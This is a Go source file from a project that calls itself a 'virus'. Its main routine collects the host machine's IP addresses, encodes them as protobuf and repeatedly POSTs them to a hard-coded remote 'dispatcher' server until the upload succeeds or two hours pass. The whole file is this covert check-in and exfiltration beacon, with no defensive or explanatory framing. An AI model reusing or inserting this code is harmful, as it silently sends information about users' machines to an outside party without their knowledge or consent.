package main

import (
	"bytes"
	"fmt"
	"net/http"
	"time"

	"github.com/golang/protobuf/proto"

	"github.com/kolya59/virus/pkg/machine"
)

const (
	dispatcherHost = "https://dispatcher-eujhpoji7a-lz.a.run.app"
)

var (
	interval = 5 * time.Minute
	timeout  = 120 * time.Minute
)

func sendData(machine machine.Machine, done chan interface{}) {
	// Convert to protobuf
	converted := machine.ToProtobuf()
	raw, err := proto.Marshal(converted)
	if err != nil {
		return
	}

	// Set up a connection to dispatcher.
	resp, err := http.Post(fmt.Sprintf("%s/machine", dispatcherHost), "text/plain", bytes.NewBuffer(raw))
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		close(done)
	}
}

func main() {
	m := machine.Machine{}
	m.GetIPS()

	done := make(chan interface{})
	ticker := time.NewTicker(interval)
	timer := time.NewTimer(timeout)

	sendData(m, done)
	for {
		select {
		case <-ticker.C:
			sendData(m, done)
		case <-timer.C:
			return
		case <-done:
			return
		}
	}
}
